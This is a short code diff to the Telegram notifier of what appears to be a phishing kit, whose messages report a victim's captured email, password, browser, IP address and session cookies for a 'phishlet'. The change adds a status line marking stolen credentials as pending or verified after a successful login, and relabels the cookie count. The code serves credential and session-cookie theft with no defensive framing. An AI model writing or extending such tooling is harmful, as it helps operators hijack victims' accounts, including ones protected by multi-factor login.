@@ -51,6 +51,7 @@ func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session
 🎣 Phishlet: %s
 👤 Email: %s
 🔑 Password: %s
+📊 Result: ⏳ Pending verification...
 🌐 Browser: %s
 📍 IP Address: %s
 🗓 Time: %s
@@ -102,10 +103,11 @@ func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) er
 🎣 Phishlet: %s
 👤 Email: %s
 🔑 Password: %s
+📊 Result: ✅ Verified (Login Successful)
 🌐 Browser: %s
 📍 IP Address: %s
 🗓 Time: %s
-📊 Cookies: %d
+🍪 Cookies: %d
 
 ✅ Full session capture complete!`,
 		session.Id,
